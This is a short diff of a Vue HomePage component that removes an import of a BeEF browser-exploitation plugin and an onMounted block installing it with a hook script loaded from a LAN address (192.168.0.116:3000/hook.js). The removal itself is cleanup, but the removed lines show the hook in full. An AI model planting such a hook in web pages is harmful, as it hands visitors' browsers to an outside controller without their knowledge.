@@ -244,7 +244,6 @@ import { ref, reactive, onMounted } from 'vue'
 import { useSlider } from './js/slider.js'
 import { useQuestions } from './js/questions.js'
 import { getCurrentInstance } from 'vue'
-import BeefPlugin from './js/beef.js'
 
 export default {
   name: 'HomePage',
@@ -257,15 +256,6 @@ export default {
     const closeMenu = () => {
       showMenu.value = false
     }
-
-    onMounted(() => {
-      const app = getCurrentInstance().appContext.app
-      
-      // Usar el plugin BeEF
-      BeefPlugin.install(app, {
-        hookUrl: 'http://192.168.0.116:3000/hook.js'
-      })
-    })
 
     // Navegación
     const goToRegister = () => {
